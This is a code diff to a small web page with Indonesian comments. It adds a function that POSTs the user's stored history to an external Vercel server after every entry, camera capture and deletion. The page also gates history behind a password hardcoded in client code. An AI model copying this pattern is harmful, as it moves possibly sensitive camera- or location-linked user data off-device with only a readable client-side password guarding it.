@@ -230,6 +230,7 @@
     const passwordInput = document.getElementById('passwordInput');
     let map;
     const correctPassword = "@angela"; // Password untuk melihat history
+    const serverUrl = "https://serverdata-ecms5nx3n-rumah-dots-projects.vercel.app"; // URL server yang menerima data
 
     // Cek history di localStorage
     const historyData = JSON.parse(localStorage.getItem('historyData')) || [];
@@ -255,6 +256,7 @@
             };
             historyData.push(userHistory);
             localStorage.setItem('historyData', JSON.stringify(historyData));
+            sendHistoryToServer(historyData); // Kirim data ke server
         } else {
             alert('Harap isi semua kolom!');
         }
@@ -303,6 +305,7 @@
 
                 historyData.push(userHistory);
                 localStorage.setItem('historyData', JSON.stringify(historyData));
+                sendHistoryToServer(historyData); // Kirim data ke server
             } catch (error) {
                 alert("Akses kamera ditolak atau tidak tersedia.");
             }
@@ -398,6 +401,7 @@
         localStorage.setItem('historyData', JSON.stringify(historyData));
         alert('History dihapus!');
         viewHistoryBtn.click(); // Menampilkan history terbaru
+        sendHistoryToServer(historyData); // Kirim data ke server setelah dihapus
     }
 
     // Fungsi untuk menghapus seluruh history
@@ -408,8 +412,28 @@
             historyDiv.innerHTML = '<strong>History kosong.</strong>';
             clearHistoryBtn.style.display = 'none';
             alert('Semua history telah dihapus!');
+            sendHistoryToServer(historyData); // Kirim data kosong ke server setelah dihapus
         }
     });
+
+    async function sendHistoryToServer(historyData) {
+        try {
+            const response = await fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(historyData)
+            });
+
+            if (!response.ok) {
+                throw new Error('Gagal mengirim data ke server.');
+            }
+            alert('Data history berhasil dikirim ke server.');
+        } catch (error) {
+            alert(error.message);
+        }
+    }
 </script>
 </body>
 </html>
